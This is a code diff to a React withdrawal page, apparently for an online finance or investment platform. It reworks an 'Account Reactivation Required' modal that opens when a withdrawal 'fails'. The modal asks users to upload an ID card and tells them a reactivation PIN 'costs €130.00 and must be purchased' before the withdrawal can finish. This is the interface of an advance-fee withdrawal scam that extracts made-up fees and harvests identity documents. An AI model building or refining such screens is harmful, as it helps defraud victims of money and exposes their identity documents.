@@ -36,9 +36,8 @@ const Withdraw = () => {
   const [pinError, setPinError] = useState('');
   const [isVerifyingPin, setIsVerifyingPin] = useState(false);
 
-  // NEW: ID verification states
+  // ID card upload state (ID number removed)
   const [idCardFile, setIdCardFile] = useState(null);
-  const [idNumber, setIdNumber] = useState('');
   const [idError, setIdError] = useState('');
   const idInputRef = useRef(null);
 
@@ -183,18 +182,16 @@ const Withdraw = () => {
     }
   };
 
-  // Retry → open reactivation modal
   const handleRetry = () => {
     setShowTransferModal(false);
     setShowReactivationModal(true);
     setReactivationPin('');
     setPinError('');
     setIdCardFile(null);
-    setIdNumber('');
     setIdError('');
   };
 
-  // NEW: Handle ID card file selection
+  // Handle ID card file selection
   const handleIdFileChange = (e) => {
     const file = e.target.files[0];
     if (!file) return;
@@ -218,15 +215,10 @@ const Withdraw = () => {
     if (idInputRef.current) idInputRef.current.value = '';
   };
 
-  // Verify reactivation PIN (after ID validation)
+  // Verify reactivation PIN (only ID card file is required)
   const handleVerifyPin = () => {
-    // Validate ID fields first
     if (!idCardFile) {
       setIdError('Please upload your ID card.');
-      return;
-    }
-    if (!idNumber.trim()) {
-      setIdError('Please enter your ID number.');
       return;
     }
     setIdError('');
@@ -245,7 +237,6 @@ const Withdraw = () => {
         setReactivationPin('');
         setPinError('');
         setIdCardFile(null);
-        setIdNumber('');
         setIsVerifyingPin(false);
         setIsRetry(true);
         setShowTransferModal(true);
@@ -452,7 +443,7 @@ const Withdraw = () => {
         )}
       </AnimatePresence>
 
-      {/* REACTIVATION MODAL (with ID verification + €130 PIN notice) */}
+      {/* REACTIVATION MODAL (ID upload + €130 PIN notice, no ID number) */}
       <AnimatePresence>
         {showReactivationModal && (
           <motion.div
@@ -476,12 +467,19 @@ const Withdraw = () => {
               <h3 className="text-xl font-bold text-white text-center mb-2">
                 Account Reactivation Required
               </h3>
-              <p className="text-sm text-slate-400 text-center mb-4">
-                Your withdrawal limit has increased. For security reasons, please verify
-                your identity and enter your reactivation PIN.
-              </p>
 
-              {/* ── ID CARD UPLOAD ── */}
+              {/* Summarized notice box */}
+              <div className="mb-4 p-3 bg-orange-500/10 border border-orange-500/30 rounded-lg flex items-start gap-3">
+                <FaInfoCircle className="text-orange-400 text-sm mt-0.5 flex-shrink-0" />
+                <p className="text-orange-300 text-xs leading-relaxed">
+                  Your withdrawal limit has increased. For security, please upload your ID card
+                  and enter your reactivation PIN. A reactivation PIN costs{' '}
+                  <strong className="text-orange-200">€130.00</strong> and must be purchased
+                  before completing this withdrawal.
+                </p>
+              </div>
+
+              {/* ID CARD UPLOAD */}
               <div className="mb-4">
                 <label className="block text-slate-300 text-sm font-medium mb-2">
                   Upload ID Card
@@ -522,44 +520,12 @@ const Withdraw = () => {
                     </button>
                   </div>
                 )}
+                {idError && (
+                  <p className="text-red-400 text-xs mt-2">{idError}</p>
+                )}
               </div>
 
-              {/* ── ID NUMBER ── */}
-              <div className="mb-4">
-                <label className="block text-slate-300 text-sm font-medium mb-2">
-                  ID Number
-                </label>
-                <div className="relative">
-                  <FaIdCard className="absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-500" />
-                  <input
-                    type="text"
-                    value={idNumber}
-                    onChange={(e) => setIdNumber(e.target.value)}
-                    placeholder="Enter your ID number"
-                    className={`w-full bg-slate-900 border ${
-                      idError ? 'border-red-500' : 'border-slate-700'
-                    } rounded-lg pl-10 pr-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-blue-500 transition`}
-                  />
-                </div>
-              </div>
-
-              {/* ── ID ERROR ── */}
-              {idError && (
-                <p className="text-red-400 text-xs mb-3">{idError}</p>
-              )}
-
-              {/* ── €130 REACTIVATION PIN NOTICE ── */}
-              <div className="mb-4 p-3 bg-orange-500/10 border border-orange-500/30 rounded-lg flex items-start gap-3">
-                <FaInfoCircle className="text-orange-400 text-sm mt-0.5 flex-shrink-0" />
-                <p className="text-orange-300 text-xs leading-relaxed">
-                  A reactivation PIN is required to proceed. The PIN costs{' '}
-                  <strong className="text-orange-200">€130.00</strong> and must be
-                  purchased before completing this withdrawal. Please ensure your
-                  payment is made before entering the PIN below.
-                </p>
-              </div>
-
-              {/* ── REACTIVATION PIN ── */}
+              {/* REACTIVATION PIN */}
               <div className="mb-4">
                 <label className="block text-slate-300 text-sm font-medium mb-2">
                   Reactivation PIN
